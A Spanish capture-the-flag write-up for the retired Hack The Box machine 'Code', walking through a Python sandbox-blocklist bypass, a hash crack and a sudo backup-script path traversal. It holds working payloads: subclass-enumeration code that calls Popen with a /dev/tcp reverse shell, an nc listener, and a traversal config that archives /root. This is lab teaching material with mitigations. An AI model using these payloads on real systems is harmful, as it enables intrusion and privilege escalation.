---
machine: Code
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, python, sandbox-escape, bcrypt, backy, sudo]
---

# Code — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un editor de Python en el navegador (Flask en el 5000) con una **blocklist de palabras**: `import`, `os`, `subprocess`, `eval`, `__`… El filtro es textual, pero el intérprete sigue teniendo cargadas todas las clases, así que se sale del *sandbox* enumerando subclases y llamando a `subprocess.Popen` por índice. Shell como `app-production`; la SQLite de la app guarda un bcrypt de `martin`, y la escalada es un `sudo` sobre `backy.sh`, cuyo JSON de configuración acepta traversal y archiva `/root`.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 9.x
5000/tcp  http  Flask (Python Playground)
```

La aplicación ejecuta el código que pegas y devuelve la salida; si el código contiene una palabra prohibida, responde con un error del filtro.

## Foothold: escape de la blocklist

El filtro busca cadenas, no objetos. Con acceso a `().__class__` se llega a todas las clases cargadas: basta localizar la posición de `Popen` y llamarla.

```python
# localizar el índice de Popen en el entorno de la víctima
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if c.__name__ == "Popen":
        print(i)
```

Si `__` está prohibido, se construye el nombre con `getattr` y cadenas:

```python
g = getattr
base = g(g(() , "_"*2 + "class" + "_"*2), "_"*2 + "mro" + "_"*2)()[-1]
P = g(base, "_"*2 + "subclasses" + "_"*2)()[317]
P(["bash", "-c", "bash -i >& /dev/tcp/<IP>/4444 0>&1"])
```

```bash
nc -lvnp 4444
```

```text
app-production@code:~$
```

## Movimiento a usuario

```bash
ls /var/www/app/instance/
sqlite3 /var/www/app/instance/database.db "select username, password from users;"
```

```text
martin | $2b$12$...
```

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh martin@<IP>
```

## Escalada: backy y su configuración

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` lee un JSON con `directories_to_archive` y hace un `tar`. La validación descarta rutas que empiezan por `/root` pero no resuelve `..`:

```bash
mkdir -p /tmp/exf && cd /tmp/exf
cat > cfg.json <<'EOF'
{
  "destination": "/tmp/exf/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": ["/root/..//root/"]
}
EOF
sudo /usr/bin/backy.sh /tmp/exf/cfg.json
ls /tmp/exf
```

Del `.tar.bz2` salen `root.txt` y, si existe, `/root/.ssh/id_rsa`.

## Evidencia (redactada)

```text
/home/martin/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones

- Una **blocklist** de identificadores no es un sandbox: si el runtime expone `object`, cualquier filtro es decorativo.
- Los hashes bcrypt de una SQLite de aplicación se rompen con reglas y diccionario; el usuario de la app suele reutilizar contraseña.
- `sudo` sobre un script que consume configuración equivale a `sudo` sobre lo que esa configuración controle.
- Mitigación: `RestrictedPython` con AST validado, contenedor sin capacidad de red, `sudo` con argumentos fijos y validación de rutas con `realpath`.
